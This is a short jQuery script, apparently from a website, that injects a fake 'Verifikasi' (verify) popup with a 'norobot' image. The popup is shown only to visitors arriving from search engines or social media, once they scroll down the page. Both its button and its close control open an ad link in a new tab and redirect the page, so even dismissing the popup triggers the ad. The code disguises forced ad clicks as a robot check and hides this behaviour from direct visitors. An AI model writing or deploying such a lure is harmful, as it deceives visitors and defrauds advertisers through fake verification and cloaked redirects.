$(document).ready(function()
{
    console.log('jquery ready!');

	var popbox = `<div class="popbox hide" id="popbox"><div aria-label='Close' class="pop-overlay" role="button" tabindex="0"/><div class="pop-content"><div class="popcontent" align="center"> <img src="https://cdn.kibrispdr.org/norobot.png" alt="norobot" /> <button class='g_url btn btn-success btn-dwn m-2'>Verifikasi</button> <br/></div> <button class='g_url popbox-close-button'>&times;</button></div></div>`;

	$(document.body).append(popbox);

    if(['.google.', 'bing.', 'yandex.', 'yahoo,', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s)))
    {
		$(window).scroll(function (event) {
		    var scroll = $(window).scrollTop();
		    if (scroll >= 200) {
		        $('#popbox').removeClass('hide');
		    }
		    console.log('scroll..');                    
		});
    }

    $(document).on('click','.g_url',function(e)
    {
        e.preventDefault();            

        window.open(direct_link_ads,"_blank");
        window.location.href = go_current;
    });

});